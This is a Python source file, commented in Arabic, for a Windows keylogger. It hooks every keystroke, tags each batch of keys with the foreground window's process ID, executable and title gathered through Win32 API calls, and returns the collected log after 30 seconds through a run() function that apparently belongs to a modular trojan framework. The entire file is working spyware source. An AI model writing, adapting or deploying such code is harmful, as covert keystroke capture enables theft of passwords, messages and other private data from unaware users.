import keyboard
import threading
import time
from ctypes import byref, create_string_buffer, c_ulong, windll

# مدة التسجيل بالثواني
TIMEOUT = 30
LOG_DATA = ""

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        # الحصول على مقبض النافذة النشطة
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
        
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        
        try:
            current_title = window_title.value.decode()
        except UnicodeDecodeError:
            current_title = "Unknown Window"
        
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)
        return process_id, executable.value.decode(), current_title

    def callback(self, event):
        global LOG_DATA
        # عند رفع الإصبع عن الزر
        if event.event_type == keyboard.KEY_UP:
            pid, exe, title = self.get_current_process()
            
            # إذا تغيرت النافذة، نسجل العنوان الجديد
            if self.current_window != title:
                self.current_window = title
                header = f'\n[ PID: {pid} - {exe} - {title} ]\n'
                print(header)
                LOG_DATA += header

            # تسجيل الزر المضغوط
            name = event.name
            if len(name) > 1:
                # للأزرار الخاصة مثل space, enter
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = f"[{name.upper()}]"
            
            print(name, end='', flush=True)
            LOG_DATA += name

def run(**args):
    global LOG_DATA
    LOG_DATA = ""
    kl = KeyLogger()
    
    # بدء تسجيل المفاتيح
    hook = keyboard.hook(kl.callback)
    
    # الانتظار لمدة معينة (TIMEOUT)
    time.sleep(TIMEOUT)
    
    # إيقاف التسجيل
    keyboard.unhook_all()
    
    return LOG_DATA